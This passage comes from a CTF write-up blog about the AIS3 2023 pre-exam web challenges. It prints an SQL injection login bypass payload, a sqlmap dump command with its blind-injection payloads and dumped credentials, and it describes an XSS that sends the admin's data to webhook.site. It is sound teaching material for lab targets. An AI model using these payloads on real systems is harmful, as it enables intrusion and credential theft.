175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 個 middle 會出錯，那就只存隨機挑的一部分就好了，存到電腦可負荷的量就好，這樣也有高機率解的出來。</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Login-Panel"><a href="#Login-Panel" class="headerlink" title="Login Panel"></a>Login Panel</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>MyFirstCTF: 24 / 111 (score &gt;= 100)</li><li>Pre-exam: 139 / 256 (score &gt;= 100)</li></ul></li></ul><p>這題是 web 的 welcome 題，是來送大家分數的。進來會看到 CTF 很常出現的 login panel。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 30rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;> <head> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;><title>Login</title> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <script type=&quot;text/javascript&quot;> function onSubmit(token) { login.submit(); } (function(c,l,a,r,i,t,y){ c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)}; t=l.createElement(r);t.async=1;t.src=&quot;https://www.clarity.ms/tag/&quot;+i; y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> </head> <body> <div class=&quot;container border rounded mt-5&quot; style=&quot;width: 25rem; max-width: 100%;&quot;> <form class=&quot;p-4&quot; id=&quot;login&quot;> <h2>Login</h2> <div class=&quot;form-text&quot;>You can login as guest/guest.</div> <div class=&quot;form-outline mt-3&quot;> <label for=&quot;username&quot; class=&quot;form-label&quot;>Username:</label> <input type=&quot;text&quot; id=&quot;username&quot; name=&quot;username&quot; class=&quot;form-control&quot;> </div> <div class=&quot;form-outline mt-3&quot;> <label for=&quot;password&quot; class=&quot;form-label&quot;>Password:</label> <input type=&quot;password&quot; id=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot;> </div> <input type=&quot;submit&quot; value=&quot;Submit&quot; class=&quot;btn btn-primary mt-3 g-recaptcha&quot; data-sitekey=&quot;6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI&quot; data-callback=&quot;onSubmit&quot;> </form> </div> </body> </html>"></iframe><p>這題比賽時有提供 <a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/login-panel">source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 所以大家可以不用通靈題目有什麼洞，直接來看看<a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L56-L72">登入部分的 code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><p>看到下方的第 3 行，使用者提供的 <code>username</code> 跟 <code>password</code> 直接被放進 SQL 的語句內，所以有明顯的 SQL injection 漏洞。</p><p>需要注意的一點是第 6 行還會檢查使用者提供的 <code>username</code> 要跟 SQL query 出來的 <code>row.username</code> 相等才能成功登入。知道這些就可以來想辦法登入了。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">'/login'</span>, recaptcha.<span class="property">middleware</span>.<span class="property">verify</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> { username, password } = req.<span class="property">body</span></span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM Users WHERE username = '<span class="subst">${username}</span>' AND password = '<span class="subst">${password}</span>'`</span>, <span class="title function_">async</span> (err, row) =&gt; {</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=dQw4w9WgXcQ`</span>)</span><br><span class="line">        <span class="keyword">if</span> (!row) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_credentials`</span>)</span><br><span class="line">        <span class="keyword">if</span> (row.<span class="property">username</span> !== username) {</span><br><span class="line">            <span class="comment">// special case</span></span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`https://www.youtube.com/watch?v=E6jbBLrxY1U`</span>)</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">recaptcha</span>.<span class="property">error</span>) {</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">recaptcha</span>.<span class="property">error</span>)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/login?msg=invalid_captcha`</span>)</span><br><span class="line">        }</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">'/2fa'</span>)</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><p>我們只需要將 <code>username</code> 設成 <code>admin</code>，<code>password</code> 設成 <code>' or ''='</code> SQL 語句就會變成下面這樣。所有在 <code>Users</code> 裡面的 row 都符合這個條件，加上使用的是 <code>db.get</code> 所以會回傳符合條件的第一個欄位，也就是 <code>admin</code> 的那個 row。</p><p>這個 payload 也可以通過第 6 行的檢查，所以就能成功登進去 <code>admin</code> 的帳戶了。有人一直繞不過第 6 行的檢查還被做成<a href="/ais3-pre-exam-2023-write-up/login-panel-meme.webp">梗圖</a>。</p><div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> Users <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">'admin'</span> <span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">''</span> <span class="keyword">or</span> <span class="string">''</span><span class="operator">=</span><span class="string">''</span></span><br></pre></td></tr></table></figure></div><p>進去後會看到 2FA 頁面，我們先來檢查他的 2FA 功能有沒有洞，因為 source 裡面有說 flag 在 <code>/dashboard</code> 裡面，直接來看 <a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/login-panel/web/app.js#L98-L106">dashboard 的 code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 37rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;>  <head>     <meta charset=&quot;UTF-8&quot;>     <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;>     <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;>     <meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;>     <title>2FA</title>     <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;>     <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script>     <script type=&quot;text/javascript&quot;>         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;);     </script> </head>  <body>     <div class=&quot;container border rounded mt-5&quot; style=&quot;width: 25rem; max-width: 100%&quot;>         <form class=&quot;p-4&quot; id=&quot;login&quot;>             <h2 class=&quot;mb-3&quot;>2FA</h2>             <div class=&quot;alert alert-info&quot; role=&quot;alert&quot;>2FA code was sent to your email. Please enter it below.</div>             <div class=&quot;alert alert-primary&quot; role=&quot;alert&quot;>If you are a guest, your 2FA code will always be <code>99999999999999</code>.</div>              <div class=&quot;form-outline mt-3&quot;>                 <label for=&quot;code&quot; class=&quot;form-label&quot;>2FA Code</label>                 <input type=&quot;number&quot; id=&quot;code&quot; name=&quot;code&quot; class=&quot;form-control&quot; value=&quot;99999999999999&quot;>             </div>                                       <input type=&quot;submit&quot; value=&quot;Submit&quot; class=&quot;btn btn-primary mt-3 g-recaptcha&quot;>         </form>     </div> </body>  </html>"></iframe><p>看到下方 <code>/dashboard</code> 的部分，他根本沒去驗 2FA 認證有沒有通過，只有看 <code>req.session.username</code>，而 <code>req.session.username</code> 在成功登入的時候就已被設成 <code>admin</code> 了，所以登入到 2FA 頁面後直接訪問 <code>/dashboard</code> 就可以看到 flag 了。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">'/dashboard'</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">session</span>.<span class="property">username</span>) {</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">'dashboard'</span>, {</span><br><span class="line">            <span class="attr">username</span>: req.<span class="property">session</span>.<span class="property">username</span>,</span><br><span class="line">            <span class="attr">flag</span>: <span class="variable constant_">FLAG</span></span><br><span class="line">        })</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">'/'</span>)</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 30rem; " scrolling="no" srcdoc="<!DOCTYPE html> <html lang=&quot;en&quot;>  <head>     <meta charset=&quot;UTF-8&quot;>     <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;>     <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;>     <meta name=&quot;robots&quot; content=&quot;noindex,nofollow&quot;>     <title>Dashboard</title>     <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;>     <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script>     <script type=&quot;text/javascript&quot;>         (function (c, l, a, r, i, t, y) {             c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };             t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i;             y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);         })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;);     </script> </head>  <body>     <div class=&quot;container&quot;>         <h2 class=&quot;mt-5&quot;>Dashboard</h2>         <div class=&quot;alert alert-info mt-4 alert-dismissible&quot; role=&quot;alert&quot;>Welcome back admin!</div>                     <div class=&quot;alert alert-primary mt-4&quot; role=&quot;alert&quot;>Here is your flag: <code>AIS3{' UNION SELECT 1, 1, 1, 1 WHERE ({condition})--}</code></div>                  <a class=&quot;btn btn-primary mt-3&quot;>Logout</a>     </div>  </body>  </html>"></iframe><p>然後這題雖然有裝 reCAPTCHA 但其實沒有裝好，所以可以直接用 sqlmap 把資料庫直接 dump 出來，只是有些地方要按對才挖的出來。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap http://url/login --data <span class="string">"username=admin*&amp;password=p"</span> --level 5 --risk 3 --dump</span><br></pre></td></tr></table></figure></div><p>執行上面這個的時候，會被問到下面這類問題，這邊要按 <code>n</code>，因為有些時候會把 sqlmap 導到 Youtube 造成 sqlmap 會有錯誤的判斷。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">got a 302 redirect to <span class="string">'http://xxx/'</span>. Do you want to follow? [Y/n]</span><br></pre></td></tr></table></figure></div><p>把資料庫 dump 出來後就直接拿去正常登入就好了。</p><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Parameter: <span class="comment">#1* ((custom) POST)</span></span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - comment)</span><br><span class="line">    Payload: username=admin%<span class="string">' OR NOT 1853=1853-- aGKT&amp;password=p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: SQLite &gt; 2.0 OR time-based blind (heavy query)</span></span><br><span class="line"><span class="string">    Payload: username=admin%'</span> OR 7991=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND <span class="string">'wNiy%'</span>=<span class="string">'wNiy&amp;password=p</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">Database: &lt;current&gt;</span></span><br><span class="line"><span class="string">Table: Users</span></span><br><span class="line"><span class="string">[2 entries]</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br><span class="line"><span class="string">| id | code           | password                        | username |</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br><span class="line"><span class="string">| 1  | 47428350415632 | e1a5654762d385c8                | admin    |</span></span><br><span class="line"><span class="string">| 2  | 99999999999999 | guest                           | guest    |</span></span><br><span class="line"><span class="string">+----+----------------+---------------------------------+----------+</span></span><br></pre></td></tr></table></figure></div><p>這題最初是想做成只能用 boolean-based blind 挖資料庫，讓大家繞 reCAPTCHA 才能解的，不過我沒去擋 <code>row.password</code> 所以可以用簡單的方法解出。</p><h4 id="E-portfolio-baby"><a href="#E-portfolio-baby" class="headerlink" title="E-portfolio baby"></a>E-portfolio baby</h4><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/tree/main/ais3-pre-exam/2023/web/e-portfolio-baby">題目 source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><ul><li>解題人數<ul><li>MyFirstCTF: 0 / 111 (score &gt;= 100)</li><li>Pre-exam: 35 / 256 (score &gt;= 100)</li></ul></li></ul><p>題目 註冊 / 登入 後會來到 <code>Edit Portfolio</code> 的頁面，像下面這樣。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;><head> <title>Edit Portfolio</title> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/s/0.7.8/clarity.js&quot;></script><script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class=&quot;container-sm mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.webp&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> <div class=&quot;mt-3 mb-3&quot;> <label class=&quot;form-label&quot; for=&quot;avatarFile&quot;>Upload avatar</label> <input type=&quot;file&quot; class=&quot;form-control&quot; id=&quot;avatarFile&quot;> </div> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mt-3&quot;>About <span id=&quot;username&quot;>Ching367436</span></h3> <textarea name=&quot;&quot; id=&quot;about&quot; class=&quot;form-control&quot; rows=&quot;10&quot;><h5>Hello!</h5>I am a <span style=&quot;color: red;&quot;>new</span> user.</textarea> </div> </div> <div class=&quot;container&quot;> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;save&quot;>Save</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;logout&quot;>Logout</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;share&quot;>Share</button> <button type=&quot;submit&quot; class=&quot;btn btn-primary mb-2&quot; id=&quot;report&quot;>Share your portfolio with admin</button> <div class=&quot;g-recaptcha&quot; data-sitekey=&quot;6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI&quot; data-callback=&quot;onReport&quot; data-size=&quot;invisible&quot;></div></div></body></html>"></iframe><p>按下 Share 後可以看到輸入的 portfolio 的 HTML 被 render 出來了。而這個頁面正是按下 Share your portfolio with admin 後，admin 會拜訪的頁面，要透過這個頁面的 XSS 偷走 admin 的密碼。</p><iframe frameBorder="0" style="overflow: visible; width: 100%; height: 35rem; " srcdoc="<html lang=&quot;en&quot;><head> <title>Share</title> <meta charset=&quot;UTF-8&quot;> <meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;> <meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;> <link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot; integrity=&quot;sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ&quot; crossorigin=&quot;anonymous&quot;> <script async=&quot;&quot; src=&quot;https://www.clarity.ms/tag/gsfl4ftdey&quot;></script><script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js&quot; integrity=&quot;sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe&quot; crossorigin=&quot;anonymous&quot;></script> <!-- Google tag (gtag.js) --> <script async=&quot;&quot; src=&quot;https://www.googletagmanager.com/gtag/js?id=G-2EDF3XCYWP&quot;></script> <script nonce=&quot;&quot;> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag(&quot;js&quot;, new Date()); gtag(&quot;config&quot;, &quot;G-2EDF3XCYWP&quot;); </script> <script type=&quot;text/javascript&quot; nonce=&quot;&quot;> (function (c, l, a, r, i, t, y) { c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) }; t = l.createElement(r); t.async = 1; t.src = &quot;https://www.clarity.ms/tag/&quot; + i; y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y); })(window, document, &quot;clarity&quot;, &quot;script&quot;, &quot;gsfl4ftdey&quot;); </script> <style> body { background-color: #ffed4a; } </style></head> <body> <div class=&quot;container mt-5&quot;> <h1 class=&quot;mb-3&quot;>Edit Portfolio</h1> <div class=&quot;row mb-5&quot;> <div class=&quot;col-sm-3&quot;> <h3 class=&quot;mb-3 mt-3&quot;>Photo</h3> <img src=&quot;/images/Ching367436.webp&quot; class=&quot;img-fluid&quot; id=&quot;avatar&quot; style=&quot;width: 15rem;&quot;> </div> <div class=&quot;col-sm-9&quot;> <h3 class=&quot;mb-3 mt-3&quot;>About <span id=&quot;username&quot;>Ching367436</span></h3> <div id=&quot;about&quot;><h5>Hello!</h5> I am a <span style=&quot;color: red;&quot;>new</span> user.</div> </div> </div> </div></body></html>"></iframe><p><a class="link" href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/views/share.eta#L30">source code <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 裡，也就是下面的第 7 行用了 <code>innerHTML</code>，而 <code>data.data.about</code> 也是我們可完全控制的，所以表示我們能 XSS。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">"&lt;%= it.nonce %&gt;"</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">`/api/share<span class="subst">${location.search}</span>`</span>)</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> res.<span class="title function_">json</span>())</span></span><br><span class="line"><span class="language-javascript">        .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> {</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (data.<span class="property">success</span>) {</span></span><br><span class="line"><span class="language-javascript">                username.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">username</span></span></span><br><span class="line"><span class="language-javascript">                about.<span class="property">innerHTML</span> = data.<span class="property">data</span>.<span class="property">about</span></span></span><br><span class="line"><span class="language-javascript">                avatar.<span class="property">src</span> = data.<span class="property">data</span>.<span class="property">avatar</span></span></span><br><span class="line"><span class="language-javascript">            } <span class="keyword">else</span> {</span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">alert</span>(data.<span class="property">message</span>)</span></span><br><span class="line"><span class="language-javascript">            }</span></span><br><span class="line"><span class="language-javascript">        })</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>有 XSS 後還需要找到能偷 密碼 的地方，剛好 <a href="https://github.com/Ching367436/My-CTF-Challenges/blob/main/ais3-pre-exam/2023/web/e-portfolio-baby/web/src/app.js#L120-L130"><code>/api/portfolio</code></a> 可以拿到使用者的密碼，因為他用了 <code>SELECT *</code>，這個送密碼到前端是 Copilot 寫的洞，如果我沒注意到這題就會變成超級水題。</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">"/api/portfolio"</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> {</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">username</span>)</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Unauthorized"</span> })</span><br><span class="line">    db.<span class="title function_">get</span>(<span class="string">"SELECT * FROM Users WHERE username = ?"</span>, req.<span class="property">session</span>.<span class="property">username</span>, <span class="function">(<span class="params">err, row</span>) =&gt;</span> {</span><br><span class="line">        <span class="keyword">if</span> (err)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Internal server error"</span> })</span><br><span class="line">        <span class="keyword">if</span> (!row)</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">false</span>, <span class="attr">message</span>: <span class="string">"Not found"</span> })</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>({ <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">data</span>: row })</span><br><span class="line">    })</span><br><span class="line">})</span><br></pre></td></tr></table></figure></div><p>這裡我們使用下方的 code 設成我們的 portfolio 來觸發 XSS，注意因為這個 XSS 的點是 <code>innerHTML</code>，所以直接插入 <code>&lt;script&gt;</code> 是不會被執行的，這裡有說明為什麼不行 <a class="link" href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations%E3%80%82">https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations。 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>下面的 script 做的是就是把使用者的資料送到 webhook.site，儲存後按下 Share your portfolio with admin，admin 拜訪後他的資料就會被送來我們這邊，flag 就在裡面，結果在下面那張圖片裡。也有另一種送資料的方式：把資料設成自己的 portfolio。</p><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 